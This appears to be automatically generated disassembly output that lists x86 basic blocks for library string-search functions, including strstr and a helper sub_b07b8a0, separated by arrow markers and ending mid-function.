0xb07b833:	add	esi, 1
0xb07b836:	mov	ecx, 1
0xb07b83b:	jmp	0xb07b778
None
|
|
|
v
0xb07b7d8:	mov	ebp, dword ptr [esp + 4]
0xb07b7dc:	add	ebp, edi
0xb07b7de:	movzx	eax, byte ptr [ebp + ecx]
0xb07b7e3:	mov	ebp, dword ptr [esp + 4]
0xb07b7e7:	cmp	byte ptr [ebp + edx], al
0xb07b7eb:	jbe	0xb07b840
None
|
|
|
v
0xb07b840:	je	0xb07b870
None
|
|
|
v
0xb07b778:	lea	edx, dword ptr [ecx + esi]
0xb07b77b:	cmp	edx, dword ptr [esp]
0xb07b77e:	jae	0xb07b7b0
None
|
|
|
v
0xb07b890:	mov	esi, edx
0xb07b892:	mov	ecx, 1
0xb07b897:	jmp	0xb07b7d0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b07b8a0
TOTAL BLOCKS :58
0xb07ba35:	lea	eax, dword ptr [edi + 1]
0xb07ba38:	neg	edi
0xb07ba3a:	add	ebp, edi
0xb07ba3c:	add	edi, edx
0xb07ba3e:	mov	dword ptr [esp + 0x10], ecx
0xb07ba42:	jmp	0xb07ba5b
None
|
|
|
v
0xb07bb7f:	test	eax, eax
0xb07bb81:	jne	0xb07bc63
None
|
|
|
v
0xb07bcb1:	mov	edi, dword ptr [esp + 0x20]
0xb07bcb5:	jmp	0xb07babc
None
|
|
|
v
0xb07b8cb:	lea	edx, dword ptr [esp + 0x440]
0xb07b8d2:	mov	dword ptr [esp + 0x20], eax
0xb07b8d6:	lea	eax, dword ptr [esp + 0x40]
0xb07b8da:	lea	esi, dword ptr [esi]
0xb07b8e0:	mov	dword ptr [eax], esi
0xb07b8e2:	add	eax, 4
0xb07b8e5:	cmp	eax, edx
0xb07b8e7:	jne	0xb07b8e0
None
|
|
|
v
0xb07b9f8:	mov	eax, dword ptr [esp + 0x20]
0xb07b9fc:	mov	ecx, dword ptr [esp + 0x1c]
0xb07ba00:	mov	ebp, dword ptr [esp + 0x450]
0xb07ba07:	mov	edi, eax
0xb07ba09:	cmp	ecx, eax
0xb07ba0b:	mov	eax, dword ptr [esp + 0x14]
0xb07ba0f:	cmovae	edi, ecx
0xb07ba12:	add	ebp, edi
0xb07ba14:	lea	edx, dword ptr [edi + eax]
0xb07ba17:	mov	eax, dword ptr [esp + 0x454]
0xb07ba1e:	add	edx, dword ptr [esp + 0xc]
0xb07ba22:	lea	ecx, dword ptr [eax - 1]
0xb07ba25:	cmp	edi, ecx
0xb07ba27:	jae	0xb07ba61
None
|
|
|
v
0xb07ba79:	mov	edi, dword ptr [esp + 0x18]
0xb07ba7d:	movzx	eax, byte ptr [ecx]
0xb07ba80:	cmp	byte ptr [edi], al
0xb07ba82:	jne	0xb07bcb1
None
|
|
|
v
0xb07bbca:	add	ecx, dword ptr [esp + 0x28]
0xb07bbce:	mov	eax, edx
0xb07bbd0:	add	eax, 1
0xb07bbd3:	mov	ebp, dword ptr [esp + 0x18]
0xb07bbd7:	mov	dword ptr [esp + 0x10], ecx
0xb07bbdb:	jmp	0xb07bbf7
None
|
|
|
v
0xb07ba48:	movzx	ecx, byte ptr [eax + edi]
0xb07ba4c:	lea	edx, dword ptr [eax + 1]
0xb07ba4f:	cmp	byte ptr [ebp + eax], cl
0xb07ba53:	jne	0xb07baf0
None
|
|
|
v
0xb07babc:	mov	eax, dword ptr [esp + 0x1c]
0xb07bac0:	add	eax, 1
0xb07bac3:	cmp	eax, edi
0xb07bac5:	ja	0xb07bc51
None
|
|
|
v
0xb07b8fb:	nop	
0xb07b8fc:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb07b93b:	test	eax, eax
0xb07b93d:	jne	0xb07bb0d
None
|
|
|
v
0xb07bbe0:	mov	ecx, dword ptr [esp + 0x10]
0xb07bbe4:	lea	edx, dword ptr [eax + 1]
0xb07bbe7:	movzx	ecx, byte ptr [eax + ecx]
0xb07bbeb:	cmp	byte ptr [ebp + eax], cl
0xb07bbef:	jne	0xb07bc90
None
|
|
|
v
0xb07b9a7:	test	eax, eax
0xb07b9a9:	jne	0xb07bc63
None
|
|
|
v
0xb07ba29:	movzx	eax, byte ptr [edx]
0xb07ba2c:	cmp	byte ptr [ebp], al
0xb07ba2f:	jne	0xb07bae7
None
|
|
|
v
0xb07bc51:	mov	eax, dword ptr [esp + 0xc]
0xb07bc55:	add	eax, dword ptr [esp + 0x14]
0xb07bc59:	add	esp, 0x440
0xb07bc5f:	pop	esi
0xb07bc60:	pop	edi
0xb07bc61:	pop	ebp
0xb07bc62:	ret	
None
|
|
|
v
0xb07b9e2:	add	dword ptr [esp + 0x14], eax
0xb07b9e6:	mov	edi, esi
0xb07b9e8:	mov	dword ptr [esp + 0x1c], 0
0xb07b9f0:	jmp	0xb07b980
None
|
|
|
v
0xb07ba61:	mov	eax, dword ptr [esp + 0x20]
0xb07ba65:	mov	ecx, dword ptr [esp + 0x14]
0xb07ba69:	add	ecx, dword ptr [esp + 0x28]
0xb07ba6d:	add	ecx, dword ptr [esp + 0xc]
0xb07ba71:	cmp	dword ptr [esp + 0x1c], eax
0xb07ba75:	mov	edi, eax
0xb07ba77:	jae	0xb07babc
None
|
|
|
v
0xb07bb58:	mov	esi, dword ptr [esp + 0x14]
0xb07bb5c:	add	esi, dword ptr [esp + 0x454]
0xb07bb63:	mov	dword ptr [esp + 4], 0
0xb07bb6b:	mov	eax, esi
0xb07bb6d:	sub	eax, edi
0xb07bb6f:	add	edi, dword ptr [esp + 0xc]
0xb07bb73:	mov	dword ptr [esp + 8], eax
0xb07bb77:	mov	dword ptr [esp], edi
0xb07bb7a:	call	0xb07c430
None
|
|
|
v
0xb07bab1:	cmp	eax, ebp
0xb07bab3:	lea	edi, dword ptr [esi + eax]
0xb07bab6:	jne	0xb07baa0
None
|
|
|
v
0xb07b911:	mov	eax, dword ptr [esp + 0x3c]
0xb07b915:	mov	ecx, dword ptr [esp + 0x20]
0xb07b919:	mov	dword ptr [esp + 0x24], eax
0xb07b91d:	add	eax, dword ptr [esp + 0x450]
0xb07b924:	mov	dword ptr [esp + 8], ecx
0xb07b928:	mov	dword ptr [esp + 4], eax
0xb07b92c:	mov	eax, dword ptr [esp + 0x450]
0xb07b933:	mov	dword ptr [esp], eax
0xb07b936:	call	0xb07c620
None
|
|
|
v
0xb07bae7:	mov	eax, edi
0xb07bae9:	lea	esi, dword ptr [esi]
0xb07baf0:	mov	edx, dword ptr [esp + 0x14]
0xb07baf4:	mov	edi, esi
0xb07baf6:	add	edx, dword ptr [esp + 0x2c]
0xb07bafa:	mov	dword ptr [esp + 0x1c], 0
0xb07bb02:	add	eax, edx
0xb07bb04:	mov	dword ptr [esp + 0x14], eax
0xb07bb08:	jmp	0xb07b980
None
|
|
|
v
0xb07bc40:	movzx	edx, byte ptr [edi + eax - 1]
0xb07bc45:	sub	eax, 1
0xb07bc48:	cmp	dl, byte ptr [ecx + eax]
0xb07bc4b:	jne	0xb07bc6f
None
|
|
|
v
0xb07b9d0:	mov	edi, dword ptr [esp + 0x24]
0xb07b9d4:	mov	edx, dword ptr [esp + 0x454]
0xb07b9db:	sub	edx, edi
0xb07b9dd:	cmp	edi, eax
0xb07b9df:	cmova	eax, edx
0xb07b9e2:	add	dword ptr [esp + 0x14], eax
0xb07b9e6:	mov	edi, esi
0xb07b9e8:	mov	dword ptr [esp + 0x1c], 0
0xb07b9f0:	jmp	0xb07b980
None
|
|
|
v
0xb07ba88:	mov	ebp, dword ptr [esp + 0x2c]
0xb07ba8c:	xor	eax, eax
0xb07ba8e:	mov	dword ptr [esp + 0x10], esi
0xb07ba92:	mov	esi, dword ptr [esp + 0x28]
0xb07ba96:	add	ebp, dword ptr [esp + 0x1c]
0xb07ba9a:	jmp	0xb07bab1
None
|
|
|
v
0xb07b900:	movzx	ecx, byte ptr [eax]
0xb07b903:	add	eax, 1
0xb07b906:	mov	dword ptr [esp + ecx*4 + 0x40], edx
0xb07b90a:	sub	edx, 1
0xb07b90d:	cmp	eax, ebp
0xb07b90f:	jne	0xb07b900
None
|
|
|
v
0xb07bc80:	add	dword ptr [esp + 0x14], eax
0xb07bc84:	mov	edi, esi
0xb07bc86:	jmp	0xb07bb58
None
|
|
|
v
0xb07b9c8:	mov	edx, dword ptr [esp + 0x1c]
0xb07b9cc:	test	edx, edx
0xb07b9ce:	je	0xb07b9e2
None
|
|
|
v
0xb07b9af:	test	esi, esi
0xb07b9b1:	je	0xb07bc63
None
|
|
|
v
0xb07bba4:	mov	edx, dword ptr [esp + 0x20]
0xb07bba8:	mov	ecx, dword ptr [esp + 0x14]
0xb07bbac:	mov	edi, dword ptr [esp + 0x1c]
0xb07bbb0:	add	ecx, edx
0xb07bbb2:	add	ecx, dword ptr [esp + 0xc]
0xb07bbb6:	cmp	edx, edi
0xb07bbb8:	jae	0xb07bbff
None
|
|
|
v
0xb07bbba:	mov	ebp, dword ptr [esp + 0x24]
0xb07bbbe:	movzx	eax, byte ptr [ecx]
0xb07bbc1:	cmp	byte ptr [ebp], al
0xb07bbc4:	jne	0xb07bcab
None
|
|
|
v
0xb07bc63:	add	esp, 0x440
0xb07bc69:	xor	eax, eax
0xb07bc6b:	pop	esi
0xb07bc6c:	pop	edi
0xb07bc6d:	pop	ebp
0xb07bc6e:	ret	
None
|
|
|
v
0xb07b9b7:	mov	eax, dword ptr [esp + 0xc]
0xb07b9bb:	movzx	eax, byte ptr [eax + esi - 1]
0xb07b9c0:	mov	eax, dword ptr [esp + eax*4 + 0x40]
0xb07b9c4:	test	eax, eax
0xb07b9c6:	je	0xb07b9f8
None
|
|
|
v
0xb07baf0:	mov	edx, dword ptr [esp + 0x14]
0xb07baf4:	mov	edi, esi
0xb07baf6:	add	edx, dword ptr [esp + 0x2c]
0xb07bafa:	mov	dword ptr [esp + 0x1c], 0
0xb07bb02:	add	eax, edx
0xb07bb04:	mov	dword ptr [esp + 0x14], eax
0xb07bb08:	jmp	0xb07b980
None
|
|
|
v
0xb07bc4d:	cmp	eax, esi
0xb07bc4f:	jne	0xb07bc40
None
|
|
|
v
0xb07bacb:	mov	eax, dword ptr [esp + 0x24]
0xb07bacf:	mov	edi, dword ptr [esp + 0x454]
0xb07bad6:	add	dword ptr [esp + 0x14], eax
0xb07bada:	sub	edi, eax
0xb07badc:	mov	dword ptr [esp + 0x1c], edi
0xb07bae0:	mov	edi, esi
0xb07bae2:	jmp	0xb07b980
None
|
|
|
v
0xb07bab8:	mov	esi, dword ptr [esp + 0x10]
0xb07babc:	mov	eax, dword ptr [esp + 0x1c]
0xb07bac0:	add	eax, 1
0xb07bac3:	cmp	eax, edi
0xb07bac5:	ja	0xb07bc51
None
|
|
|
v
0xb07ba5b:	cmp	dword ptr [esp + 0x10], eax
0xb07ba5f:	jne	0xb07ba48
None
|
|
|
v
0xb07baa0:	mov	edx, dword ptr [esp + 0x18]
0xb07baa4:	movzx	edx, byte ptr [edx + eax - 1]
0xb07baa9:	sub	eax, 1
0xb07baac:	cmp	dl, byte ptr [ecx + eax]
0xb07baaf:	jne	0xb07bab8
None
|
|
|
v
0xb07bc25:	mov	eax, 1
0xb07bc2a:	mov	ebp, dword ptr [esp + 0x18]
0xb07bc2e:	sub	eax, dword ptr [esp + 0x20]
0xb07bc32:	mov	dword ptr [esp + 0x10], esi
0xb07bc36:	mov	edx, eax
0xb07bc38:	xor	eax, eax
0xb07bc3a:	mov	esi, edx
0xb07bc3c:	jmp	0xb07bc4d
None
|
|
|
v
0xb07bb0d:	mov	ecx, dword ptr [esp + 0x20]
0xb07bb11:	mov	eax, esi
0xb07bb13:	mov	dword ptr [esp + 0x14], 0
0xb07bb1b:	mov	dword ptr [esp + 0x454], esi
0xb07bb22:	sub	eax, ecx
0xb07bb24:	cmp	eax, ecx
0xb07bb26:	cmovb	eax, ecx
0xb07bb29:	add	eax, 1
0xb07bb2c:	mov	dword ptr [esp + 0x2c], eax
0xb07bb30:	mov	dword ptr [esp + 0x3c], eax
0xb07bb34:	mov	eax, dword ptr [esp + 0x450]
0xb07bb3b:	add	eax, ecx
0xb07bb3d:	neg	ecx
0xb07bb3f:	mov	ebp, eax
0xb07bb41:	mov	dword ptr [esp + 0x24], eax
0xb07bb45:	add	ebp, ecx
0xb07bb47:	lea	eax, dword ptr [esi - 1]
0xb07bb4a:	mov	dword ptr [esp + 0x1c], eax
0xb07bb4e:	mov	dword ptr [esp + 0x28], ecx
0xb07bb52:	mov	dword ptr [esp + 0x18], ebp
0xb07bb56:	nop	
0xb07bb58:	mov	esi, dword ptr [esp + 0x14]
0xb07bb5c:	add	esi, dword ptr [esp + 0x454]
0xb07bb63:	mov	dword ptr [esp + 4], 0
0xb07bb6b:	mov	eax, esi
0xb07bb6d:	sub	eax, edi
0xb07bb6f:	add	edi, dword ptr [esp + 0xc]
0xb07bb73:	mov	dword ptr [esp + 8], eax
0xb07bb77:	mov	dword ptr [esp], edi
0xb07bb7a:	call	0xb07c430
None
|
|
|
v
0xb07bc77:	mov	eax, dword ptr [esp + 0x2c]
0xb07bc7b:	nop	
0xb07bc7c:	lea	esi, dword ptr [esi]
0xb07bc80:	add	dword ptr [esp + 0x14], eax
0xb07bc84:	mov	edi, esi
0xb07bc86:	jmp	0xb07bb58
None
|
|
|
v
0xb07b8e0:	mov	dword ptr [eax], esi
0xb07b8e2:	add	eax, 4
0xb07b8e5:	cmp	eax, edx
0xb07b8e7:	jne	0xb07b8e0
None
|
|
|
v
0xb07bc90:	mov	dword ptr [esp + 0x18], ebp
0xb07bc94:	mov	edx, dword ptr [esp + 0x14]
0xb07bc98:	mov	edi, esi
0xb07bc9a:	sub	edx, dword ptr [esp + 0x20]
0xb07bc9e:	lea	eax, dword ptr [eax + edx + 1]
0xb07bca2:	mov	dword ptr [esp + 0x14], eax
0xb07bca6:	jmp	0xb07bb58
None
|
|
|
v
0xb07ba59:	mov	eax, edx
0xb07ba5b:	cmp	dword ptr [esp + 0x10], eax
0xb07ba5f:	jne	0xb07ba48
None
|
|
|
v
0xb07b943:	mov	ecx, dword ptr [esp + 0x20]
0xb07b947:	mov	dword ptr [esp + 0x1c], 0
0xb07b94f:	mov	dword ptr [esp + 0x14], 0
0xb07b957:	mov	dword ptr [esp + 0x454], esi
0xb07b95e:	mov	eax, ecx
0xb07b960:	sub	eax, 1
0xb07b963:	mov	dword ptr [esp + 0x28], eax
0xb07b967:	add	eax, dword ptr [esp + 0x450]
0xb07b96e:	mov	dword ptr [esp + 0x18], eax
0xb07b972:	mov	eax, 1
0xb07b977:	sub	eax, ecx
0xb07b979:	mov	dword ptr [esp + 0x2c], eax
0xb07b97d:	lea	esi, dword ptr [esi]
0xb07b980:	mov	esi, dword ptr [esp + 0x14]
0xb07b984:	add	esi, dword ptr [esp + 0x454]
0xb07b98b:	mov	dword ptr [esp + 4], 0
0xb07b993:	mov	eax, esi
0xb07b995:	sub	eax, edi
0xb07b997:	add	edi, dword ptr [esp + 0xc]
0xb07b99b:	mov	dword ptr [esp + 8], eax
0xb07b99f:	mov	dword ptr [esp], edi
0xb07b9a2:	call	0xb07c430
None
|
|
|
v
0xb07bbff:	mov	eax, dword ptr [esp + 0x20]
0xb07bc03:	mov	edi, dword ptr [esp + 0x450]
0xb07bc0a:	mov	ecx, dword ptr [esp + 0x14]
0xb07bc0e:	sub	eax, 1
0xb07bc11:	add	edi, eax
0xb07bc13:	add	ecx, eax
0xb07bc15:	add	ecx, dword ptr [esp + 0xc]
0xb07bc19:	cmp	eax, 0xff
0xb07bc1c:	je	0xb07bc51
None
|
|
|
v
0xb07bbf7:	cmp	edi, eax
0xb07bbf9:	jne	0xb07bbe0
None
|
|
|
v
0xb07bc6f:	mov	esi, dword ptr [esp + 0x10]
0xb07bc73:	mov	dword ptr [esp + 0x18], ebp
0xb07bc77:	mov	eax, dword ptr [esp + 0x2c]
0xb07bc7b:	nop	
0xb07bc7c:	lea	esi, dword ptr [esi]
0xb07bc80:	add	dword ptr [esp + 0x14], eax
0xb07bc84:	mov	edi, esi
0xb07bc86:	jmp	0xb07bb58
None
|
|
|
v
0xb07bc94:	mov	edx, dword ptr [esp + 0x14]
0xb07bc98:	mov	edi, esi
0xb07bc9a:	sub	edx, dword ptr [esp + 0x20]
0xb07bc9e:	lea	eax, dword ptr [eax + edx + 1]
0xb07bca2:	mov	dword ptr [esp + 0x14], eax
0xb07bca6:	jmp	0xb07bb58
None
|
|
|
v
0xb07bc1e:	movzx	eax, byte ptr [ecx]
0xb07bc21:	cmp	byte ptr [edi], al
0xb07bc23:	jne	0xb07bc77
None
|
|
|
v
0xb07bb8f:	mov	eax, dword ptr [esp + 0xc]
0xb07bb93:	movzx	eax, byte ptr [eax + esi - 1]
0xb07bb98:	mov	eax, dword ptr [esp + eax*4 + 0x40]
0xb07bb9c:	test	eax, eax
0xb07bb9e:	jne	0xb07bc80
None
|
|
|
v
0xb07b980:	mov	esi, dword ptr [esp + 0x14]
0xb07b984:	add	esi, dword ptr [esp + 0x454]
0xb07b98b:	mov	dword ptr [esp + 4], 0
0xb07b993:	mov	eax, esi
0xb07b995:	sub	eax, edi
0xb07b997:	add	edi, dword ptr [esp + 0xc]
0xb07b99b:	mov	dword ptr [esp + 8], eax
0xb07b99f:	mov	dword ptr [esp], edi
0xb07b9a2:	call	0xb07c430
None
|
|
|
v
0xb07b8a0:	push	ebp
0xb07b8a1:	push	edi
0xb07b8a2:	mov	edi, edx
0xb07b8a4:	push	esi
0xb07b8a5:	sub	esp, 0x440
0xb07b8ab:	mov	dword ptr [esp + 0xc], eax
0xb07b8af:	mov	esi, dword ptr [esp + 0x454]
0xb07b8b6:	lea	eax, dword ptr [esp + 0x3c]
0xb07b8ba:	mov	dword ptr [esp], eax
0xb07b8bd:	mov	eax, dword ptr [esp + 0x450]
0xb07b8c4:	mov	edx, esi
0xb07b8c6:	call	0xb07b750
None
|
|
|
v
0xb07bbf5:	mov	eax, edx
0xb07bbf7:	cmp	edi, eax
0xb07bbf9:	jne	0xb07bbe0
None
|
|
|
v
0xb07b8e9:	mov	eax, dword ptr [esp + 0x450]
0xb07b8f0:	mov	ebp, esi
0xb07b8f2:	lea	edx, dword ptr [esi - 1]
0xb07b8f5:	add	ebp, eax
0xb07b8f7:	test	esi, esi
0xb07b8f9:	je	0xb07b911
None
|
|
|
v
0xb07bb87:	test	esi, esi
0xb07bb89:	je	0xb07bc63
None
|
|
|
v
0xb07bbfb:	mov	dword ptr [esp + 0x18], ebp
0xb07bbff:	mov	eax, dword ptr [esp + 0x20]
0xb07bc03:	mov	edi, dword ptr [esp + 0x450]
0xb07bc0a:	mov	ecx, dword ptr [esp + 0x14]
0xb07bc0e:	sub	eax, 1
0xb07bc11:	add	edi, eax
0xb07bc13:	add	ecx, eax
0xb07bc15:	add	ecx, dword ptr [esp + 0xc]
0xb07bc19:	cmp	eax, 0xff
0xb07bc1c:	je	0xb07bc51
None
|
|
|
v
0xb07bcab:	mov	eax, dword ptr [esp + 0x20]
0xb07bcaf:	jmp	0xb07bc94
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:strstr
TOTAL BLOCKS :75
0xb07be0c:	mov	ebp, dword ptr [esp + 0x30]
0xb07be10:	mov	esi, dword ptr [esp + 0x28]
0xb07be14:	mov	eax, edi
0xb07be16:	mov	ecx, dword ptr [esp + 0x2c]
0xb07be1a:	mov	dword ptr [esp + 0x24], ebp
0xb07be1e:	mov	ebp, edi
0xb07be20:	sub	eax, esi
0xb07be22:	cmp	eax, esi
0xb07be24:	cmovb	eax, esi
0xb07be27:	add	eax, 1
0xb07be2a:	mov	dword ptr [esp + 0x5c], eax
0xb07be2e:	lea	edx, dword ptr [esi - 1]
0xb07be31:	neg	esi
0xb07be33:	mov	dword ptr [esp + 0x4c], eax
0xb07be37:	mov	eax, dword ptr [esp + 0x34]
0xb07be3b:	add	ecx, dword ptr [esp + 0x30]
0xb07be3f:	mov	dword ptr [esp + 0x44], edx
0xb07be43:	mov	dword ptr [esp + 0x3c], esi
0xb07be47:	movzx	edx, byte ptr [eax]
0xb07be4a:	mov	dword ptr [esp + 0x38], ecx
0xb07be4e:	add	ecx, esi
0xb07be50:	cmp	byte ptr [esp + 0x18], dl
0xb07be54:	mov	dword ptr [esp + 0x40], ecx
0xb07be58:	lea	ecx, dword ptr [eax + 1]
0xb07be5b:	je	0xb07c092
None
|
|
|
v
0xb07bef0:	mov	eax, dword ptr [esp + 0x1c]
0xb07bef4:	mov	dword ptr [esp + 4], 0
0xb07befc:	add	eax, edi
0xb07befe:	mov	dword ptr [esp + 0x30], eax
0xb07bf02:	mov	esi, eax
0xb07bf04:	sub	eax, ebp
0xb07bf06:	add	ebp, dword ptr [esp + 0x20]
0xb07bf0a:	mov	dword ptr [esp + 8], eax
0xb07bf0e:	mov	dword ptr [esp], ebp
0xb07bf11:	call	0xb07c430
None
|
|
|
v
0xb07bfd8:	mov	edi, dword ptr [esp + 0x38]
0xb07bfdc:	mov	eax, dword ptr [esp + 0x24]
0xb07bfe0:	add	eax, 1
0xb07bfe3:	cmp	esi, eax
0xb07bfe5:	jb	0xb07c12c
None
|
|
|
v
0xb07c118:	movzx	ecx, byte ptr [esi + eax - 1]
0xb07c11d:	sub	eax, 1
0xb07c120:	movzx	edx, byte ptr [edi + eax]
0xb07c124:	cmp	cl, dl
0xb07c126:	jne	0xb07c139
None
|
|
|
v
0xb07bda1:	mov	eax, dword ptr [esp + 0x2c]
0xb07bda5:	mov	edx, ebp
0xb07bda7:	mov	dword ptr [esp + 4], edi
0xb07bdab:	mov	dword ptr [esp], eax
0xb07bdae:	mov	eax, dword ptr [esp + 0x20]
0xb07bdb2:	call	0xb07b8a0
None
|
|
|
v
0xb07be70:	add	esp, 0x6c
0xb07be73:	xor	eax, eax
0xb07be75:	pop	ebx
0xb07be76:	pop	esi
0xb07be77:	pop	edi
0xb07be78:	pop	ebp
0xb07be79:	ret	
None
|
|
|
v
0xb07bd0f:	add	ecx, 1
0xb07bd12:	add	esi, 1
0xb07bd15:	cmp	al, dl
0xb07bd17:	sete	al
0xb07bd1a:	and	ebp, eax
0xb07bd1c:	movzx	eax, byte ptr [ecx]
0xb07bd1f:	test	al, al
0xb07bd21:	jne	0xb07bd08
None
|
|
|
v
0xb07bfaa:	mov	ebp, dword ptr [esp + 0x34]
0xb07bfae:	xor	eax, eax
0xb07bfb0:	mov	dword ptr [esp + 0x38], edi
0xb07bfb4:	mov	edi, edx
0xb07bfb6:	add	ebp, esi
0xb07bfb8:	jmp	0xb07bfd1
None
|
|
|
v
0xb07bcd3:	add	ebx, 0x12f32d
0xb07bcd9:	movzx	eax, byte ptr [eax]
0xb07bcdc:	test	al, al
0xb07bcde:	je	0xb07c15b
None
|
|
|
v
0xb07bcf6:	mov	esi, edi
0xb07bcf8:	mov	ecx, dword ptr [esp + 0x80]
0xb07bcff:	mov	ebp, 1
0xb07bd04:	jmp	0xb07bd0f
None
|
|
|
v
0xb07c189:	mov	eax, dword ptr [esp + 0x20]
0xb07c18d:	jmp	0xb07bdb7
None
|
|
|
v
0xb07bf7e:	mov	ecx, dword ptr [esp + 0x1c]
0xb07bf82:	mov	edx, dword ptr [esp + 0x40]
0xb07bf86:	mov	esi, dword ptr [esp + 0x24]
0xb07bf8a:	add	ecx, edx
0xb07bf8c:	add	ecx, dword ptr [esp + 0x20]
0xb07bf90:	cmp	dword ptr [esp + 0x28], esi
0xb07bf94:	jbe	0xb07c152
None
|
|
|
v
0xb07c0dc:	cmp	ebp, eax
0xb07c0de:	jne	0xb07c0c8
None
|
|
|
v
0xb07beb6:	test	eax, eax
0xb07beb8:	jne	0xb07bdbf
None
|
|
|
v
0xb07bf9a:	mov	ebp, dword ptr [esp + 0x18]
0xb07bf9e:	movzx	eax, byte ptr [ecx]
0xb07bfa1:	cmp	byte ptr [ebp], al
0xb07bfa4:	jne	0xb07c152
None
|
|
|
v
0xb07bd79:	mov	edx, dword ptr [esp + 0x80]
0xb07bd80:	sub	esi, edi
0xb07bd82:	mov	dword ptr [esp + 0x2c], esi
0xb07bd86:	mov	esi, 1
0xb07bd8b:	add	edx, edi
0xb07bd8d:	mov	eax, edx
0xb07bd8f:	sub	eax, ecx
0xb07bd91:	cmp	ecx, edx
0xb07bd93:	cmova	eax, esi
0xb07bd96:	cmp	edi, 0x1f
0xb07bd99:	mov	ebp, eax
0xb07bd9b:	jbe	0xb07be80
None
|
|
|
v
0xb07bf68:	movzx	ecx, byte ptr [eax + ebp]
0xb07bf6c:	lea	edx, dword ptr [eax + 1]
0xb07bf6f:	cmp	byte ptr [esi + eax], cl
0xb07bf72:	jne	0xb07c008
None
|
|
|
v
0xb07bebe:	mov	ecx, dword ptr [esp + 0x28]
0xb07bec2:	mov	edx, dword ptr [esp + 0x2c]
0xb07bec6:	mov	dword ptr [esp + 0x24], 0
0xb07bece:	mov	dword ptr [esp + 0x1c], 0
0xb07bed6:	mov	eax, ecx
0xb07bed8:	sub	esi, ecx
0xb07beda:	sub	eax, 1
0xb07bedd:	add	edx, eax
0xb07bedf:	mov	dword ptr [esp + 0x40], eax
0xb07bee3:	mov	dword ptr [esp + 0x18], edx
0xb07bee7:	mov	dword ptr [esp + 0x34], esi
0xb07beeb:	nop	
0xb07beec:	lea	esi, dword ptr [esi]
0xb07bef0:	mov	eax, dword ptr [esp + 0x1c]
0xb07bef4:	mov	dword ptr [esp + 4], 0
0xb07befc:	add	eax, edi
0xb07befe:	mov	dword ptr [esp + 0x30], eax
0xb07bf02:	mov	esi, eax
0xb07bf04:	sub	eax, ebp
0xb07bf06:	add	ebp, dword ptr [esp + 0x20]
0xb07bf0a:	mov	dword ptr [esp + 8], eax
0xb07bf0e:	mov	dword ptr [esp], ebp
0xb07bf11:	call	0xb07c430
None
|
|
|
v
0xb07bf26:	mov	eax, dword ptr [esp + 0x28]
0xb07bf2a:	mov	esi, dword ptr [esp + 0x24]
0xb07bf2e:	mov	ecx, eax
0xb07bf30:	cmp	esi, eax
0xb07bf32:	mov	eax, dword ptr [esp + 0x2c]
0xb07bf36:	cmovae	ecx, esi
0xb07bf39:	lea	esi, dword ptr [eax + ecx]
0xb07bf3c:	mov	eax, dword ptr [esp + 0x1c]
0xb07bf40:	lea	edx, dword ptr [ecx + eax]
0xb07bf43:	add	edx, dword ptr [esp + 0x20]
0xb07bf47:	cmp	edi, ecx
0xb07bf49:	jbe	0xb07bf7e
None
|
|
|
v
0xb07c128:	cmp	eax, ebp
0xb07c12a:	jne	0xb07c118
None
|
|
|
v
0xb07c008:	mov	edx, dword ptr [esp + 0x1c]
0xb07c00c:	add	edx, dword ptr [esp + 0x34]
0xb07c010:	mov	dword ptr [esp + 0x24], 0
0xb07c018:	add	eax, edx
0xb07c01a:	mov	dword ptr [esp + 0x1c], eax
0xb07c01e:	jmp	0xb07bffb
None
|
|
|
v
0xb07c0da:	mov	eax, edx
0xb07c0dc:	cmp	ebp, eax
0xb07c0de:	jne	0xb07c0c8
None
|
|
|
v
0xb07c100:	mov	eax, 1
0xb07c105:	sub	eax, dword ptr [esp + 0x28]
0xb07c109:	mov	dword ptr [esp + 0x48], ebp
0xb07c10d:	mov	ecx, eax
0xb07c10f:	xor	eax, eax
0xb07c111:	mov	ebp, ecx
0xb07c113:	jmp	0xb07c128
None
|
|
|
v
0xb07c13d:	test	dl, dl
0xb07c13f:	je	0xb07be70
None
|
|
|
v
0xb07c0e0:	mov	eax, dword ptr [esp + 0x44]
0xb07c0e4:	mov	esi, dword ptr [esp + 0x2c]
0xb07c0e8:	mov	edi, dword ptr [esp + 0x1c]
0xb07c0ec:	add	esi, eax
0xb07c0ee:	add	edi, eax
0xb07c0f0:	add	edi, dword ptr [esp + 0x20]
0xb07c0f4:	cmp	eax, 0xff
0xb07c0f7:	je	0xb07c12c
None
|
|
|
v
0xb07bf78:	mov	eax, edx
0xb07bf7a:	cmp	edi, eax
0xb07bf7c:	jne	0xb07bf68
None
|
|
|
v
0xb07bcc0:	push	ebp
0xb07bcc1:	push	edi
0xb07bcc2:	push	esi
0xb07bcc3:	push	ebx
0xb07bcc4:	sub	esp, 0x6c
0xb07bcc7:	mov	eax, dword ptr [esp + 0x80]
0xb07bcce:	call	0xb1267db
None
|
|
|
v
0xb07bfd1:	cmp	eax, ebp
0xb07bfd3:	lea	esi, dword ptr [edi + eax]
0xb07bfd6:	jne	0xb07bfc0
None
|
|
|
v
0xb07bdb7:	add	esp, 0x6c
0xb07bdba:	pop	ebx
0xb07bdbb:	pop	esi
0xb07bdbc:	pop	edi
0xb07bdbd:	pop	ebp
0xb07bdbe:	ret	
None
|
|
|
v
0xb07c145:	mov	edi, dword ptr [esp + 0x1c]
0xb07c149:	add	edi, dword ptr [esp + 0x4c]
0xb07c14d:	jmp	0xb07c03c
None
|
|
|
v
0xb07c0f9:	movzx	edx, byte ptr [edi]
0xb07c0fc:	cmp	byte ptr [esi], dl
0xb07c0fe:	jne	0xb07c13d
None
|
|
|
v
0xb07c12c:	mov	eax, dword ptr [esp + 0x20]
0xb07c130:	add	eax, dword ptr [esp + 0x1c]
0xb07c134:	jmp	0xb07bdb7
None
|
|
|
v
0xb07bfdc:	mov	eax, dword ptr [esp + 0x24]
0xb07bfe0:	add	eax, 1
0xb07bfe3:	cmp	esi, eax
0xb07bfe5:	jb	0xb07c12c
None
|
|
|
v
0xb07bf7a:	cmp	edi, eax
0xb07bf7c:	jne	0xb07bf68
None
|
|
|
v
0xb07c03c:	mov	ecx, dword ptr [esp + 0x24]
0xb07c040:	lea	esi, dword ptr [edi + ebp]
0xb07c043:	mov	eax, esi
0xb07c045:	mov	dword ptr [esp + 4], 0
0xb07c04d:	sub	eax, ecx
